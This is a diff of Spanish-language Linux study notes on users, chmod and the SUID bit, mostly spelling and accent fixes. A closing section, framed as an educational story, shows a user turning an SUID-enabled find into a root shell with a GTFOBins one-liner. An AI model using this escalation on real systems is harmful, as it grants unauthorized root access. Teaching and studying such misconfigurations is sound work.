@@ -1,8 +1,8 @@
-Como bien sabemos los usaurios del sistema se encuentran en `> /etc/passwd` cada uno de estos usuarios tiene una shell, podemos ver las shells registradas en el sistema.
+Como bien sabemos los usuarios del sistema se encuentran en `> /etc/passwd` cada uno de estos usuarios tiene una shell, podemos ver las shell registradas en el sistema.
 
 	> /etc/shells
 
-Si deseamos filtrar los usuarios, podemos aplicar un filtro por quien utiliza una *shell* ya que estan siempre terminan en *sh*
+Si deseamos filtrar los usuarios, podemos aplicar un filtro por quien utiliza una *shell* ya que están siempre terminan en *sh*
 
 	cat /etc/passwd | grep "sh$" | awk '{print $1}' FS=':'
 
@@ -16,7 +16,7 @@ s4tisfacti0n
 Con `> id` podemos ver lo grupos a los que pertenece el usuario.
 
 ## Creacion de usuarios
-Creamos el directorio correspondiente del usaurio
+Creamos el directorio correspondiente del usuario
 
 	> mkdir /home/white
 
@@ -26,11 +26,11 @@ Creamos el usuario
 -d *Directorio correspondiente al usuario*
 -s *Tipo de shell a usar*
 
-Obviamente le asignamos como propetario a *white:white*  de su directorio.
+Obviamente le asignamos como propietario a *white:white*  de su directorio.
 
 	> chown white:white /home/white
 
-Y ya estariael usuario.
+Y ya estaría el usuario.
 
 	white@DESKTOP-0365ART:~$ pwd
 	/home/white
@@ -52,10 +52,11 @@ Y ya estariael usuario.
  
 *r*-> read
 *w* -> write/alter/create/delete
-*x* -> *f*: execute | *d*: atravezar (cd /opt) 
+*x* -> *f*: execute | *d*: atravesar (cd /opt) 
 
-## Asignacion de permisos & grupos
-La asignacion la podemos otorgar con **chmod** que nos sirve para cambiar los permisos.
+## Asignación de permisos & grupos
+
+La asignación la podemos otorgar con **chmod** que nos sirve para cambiar los permisos.
 ``` bash
 	drwxr-xr-x 2 white white 4096 oct 30 07:31 directorio
 	#agregar (+), quitar (-)
@@ -84,11 +85,11 @@ La **s** en rws significa setuid, lo que significa establecer ID de usuario. Est
 *Nota:*
 Este bit de permiso es un riesgo para la seguridad y solo debe aplicarse cuando sea absolutamente necesario.
 
-#### Explotacion y abuso de privilegios
+#### Explotación y abuso de privilegios
 
 Asignar permiso SUID.
-> Conversacion
--white: Oye root nesesito buscar archivos privilegiados con find, dame permiso no?
+> Conversación
+-white: Oye root necesito buscar archivos privilegiados con find, dame permiso no?
 -root: Vale solo quieres buscar archivos.
 -white: Si claro.
 
@@ -101,15 +102,15 @@ Añadiendo un 4 y los permisos del archivo podemos otorgar el permiso UID.
 	root> which find | xargs ls -l
 	-rwsr-xr-x 1 root root 298576 abr 19  2022 /usr/bin/find
 
-> Conversacion
+> Conversación
 > -white: Muchas gracias root :)
-> -Narrador: Pero white no tiene buenas intencionas asi que busca escalar privilegios.
+> -Narrador: Pero white no tiene buenas intenciones así que busca escalar privilegios.
 > 
 
-Asi que va a [GTFobins](https://gtfobins.github.io) y encontro que puede ejecutar una bash con el con *find*
+Así que va a [GTFobins](https://gtfobins.github.io) y encontró que puede ejecutar una bash con el con *find*
 
 	find . -exec /bin/bash -p \; -quit
-Qe consiste en buscar un archivo executable para ejecutar una bash, cuando encuentre este cierra el find.
+Que consiste en buscar un archivo executable para ejecutar una bash, cuando encuentre este cierra el find.
 ``` bash
 white@DESKTOP-0365ART:~$ find . -exec /bin/bash -p \; -quit
 bash-5.2# whoami
